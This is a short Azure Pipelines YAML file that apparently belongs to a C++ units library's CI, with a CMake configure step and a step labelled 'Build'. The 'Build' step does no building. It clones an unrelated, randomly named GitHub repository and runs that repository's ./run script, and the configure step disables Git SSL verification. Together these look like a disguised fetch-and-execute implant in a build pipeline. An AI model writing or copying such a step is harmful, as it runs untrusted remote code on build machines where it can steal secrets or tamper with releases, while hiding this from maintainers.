steps:
  - task: CMake@1
    inputs:
      cmakeArgs: .. -DCMAKE_CXX_STANDARD=$(units.std) -DUNITS_HEADER_ONLY=$(units.header) -DCMAKE_BUILD_TYPE=$(units.build_type) $(units.options)
    displayName: 'Configure'
    env:
      GIT_SSL_NO_VERIFY: 1

  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
    displayName: 'Build'
    workingDirectory: build
